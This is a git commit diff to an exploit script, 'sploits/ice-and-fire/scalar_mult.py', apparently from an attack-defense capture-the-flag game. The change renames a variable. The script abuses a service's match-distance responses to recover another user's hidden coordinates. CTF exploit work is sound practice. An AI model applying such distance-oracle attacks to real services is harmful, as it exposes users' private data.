54d5b7c68de007b4808a196483db1125e5c30e67
Ilya <xmikasax.main@gmail.com>
2020-04-10 16:12:26 +0300

    Add static sploit

--- sploits/ice-and-fire/scalar_mult.py
+++ sploits/ice-and-fire/scalar_mult.py
@@ -6,7 +6,7 @@ from checklib import *
 from iaf_lib import *
 
 ip = sys.argv[1]
-username = sys.argv[2]
+hint = sys.argv[2]
 url = f"http://{ip}:31337/api"
 
 mch = CheckMachine(BaseChecker(ip))
@@ -18,14 +18,14 @@ def restore_coord(num):
     u1 = User(coordinates=coordinates)
     mch.register(s1, u1)
     mch.login(s1, u1)
-    d1 = mch.match(s1, username).distance ** 2
+    d1 = mch.match(s1, hint).distance ** 2
 
     coordinates[num] = 1000
     s2 = get_initialized_session()
     u2 = User(coordinates=coordinates)
     mch.register(s2, u2)
     mch.login(s2, u2)
-    d2 = mch.match(s2, username).distance ** 2
+    d2 = mch.match(s2, hint).distance ** 2
 
     return (d1 - d2 + 1000000.0) / 2000.0
 
@@ -38,5 +38,5 @@ s = get_initialized_session()
 u = User(coordinates=answer)
 mch.register(s, u)
 mch.login(s, u)
-m = mch.match(s, username)
+m = mch.match(s, hint)
 print(m)
